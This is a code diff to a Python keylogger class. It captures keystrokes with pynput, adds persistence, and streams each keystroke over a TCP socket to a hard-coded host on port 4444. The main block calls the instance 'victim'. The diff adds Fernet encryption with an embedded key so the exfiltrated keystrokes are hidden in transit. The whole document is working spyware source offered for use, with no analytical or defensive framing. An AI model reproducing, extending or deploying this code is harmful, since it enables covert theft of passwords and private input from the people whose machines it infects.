@@ -1,9 +1,11 @@
 from pynput.keyboard import Listener
 import socket
 import manipulate
+from cryptography.fernet import Fernet
+
 
 class Keylogger():
-  
+
 	def __init__(self, Host, Port):
 
 		self.__Host = Host
@@ -19,15 +21,16 @@ class Keylogger():
 		self.client = None
 		self.client_connect = False
 
+
 	def connect_server(self):
 
 		try:
 				
-				self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-				Address = (self.__Host, self.__Port)
-				self.client.connect(Address)
-				print(f"Connected to {self.__Host}:{self.__Port}")
-				self.client_connect = True
+			self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			Address = (self.__Host, self.__Port)
+			self.client.connect(Address)
+			print(f"Connected to {self.__Host}:{self.__Port}")
+			self.client_connect = True
 		
 		except Exception as e:
 
@@ -51,8 +54,8 @@ class Keylogger():
 			keystroke = ""
 		if keystroke:
 
-			byte_msg = keystroke.encode('utf-8')
-
+			# byte_msg = keystroke.encode('utf-8')
+			byte_msg = crypt.encrypt(keystroke.encode('utf-8'))
 			if self.client_connect:
 
 				self.client.sendall(byte_msg)
@@ -63,6 +66,11 @@ if __name__ == '__main__':
 	Host = "192.168.0.199"
 	Port = 4444
 	victim = Keylogger(Host, Port)
+
+   # load the key
+	KEY = b"GLpnLBTkUsqcwT5TYpMgQT0c-W_Ust13ybM3ZK5whj8="
+	crypt = Fernet(KEY)
+
 
 	victim.persistance()
 	victim.connect_server()
